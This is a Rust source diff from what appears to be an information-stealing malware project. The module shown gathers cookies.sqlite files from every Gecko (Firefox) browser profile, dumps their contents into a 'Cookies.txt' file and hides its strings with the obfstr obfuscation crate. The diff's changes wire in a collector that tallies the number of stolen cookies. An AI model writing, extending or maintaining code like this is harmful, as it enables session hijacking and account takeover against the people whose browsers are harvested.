@@ -1,12 +1,13 @@
 use crate::alloc::borrow::ToOwned;
+use crate::gecko::GeckoBrowserData;
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use collector::{Browser, Collector};
+use database::TableRecord;
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
-use crate::gecko::GeckoBrowserData;
-use obfstr::obfstr as s;
-use database::TableRecord;
 
 const MOZ_COOKIES_NAME: usize = 2;
 const MOZ_COOKIES_VALUE: usize = 3;
@@ -24,10 +25,10 @@ impl<'a> CookiesTask<'a> {
     }
 }
 
-impl Task for CookiesTask<'_> {
+impl<C: Collector> Task<C> for CookiesTask<'_> {
     parent_name!("Cookies.txt");
 
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("cookies.sqlite"),
@@ -37,6 +38,7 @@ impl Task for CookiesTask<'_> {
             return
         };
 
+        collector.get_browser().increase_cookies_by(cookies.len());
         let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
 }
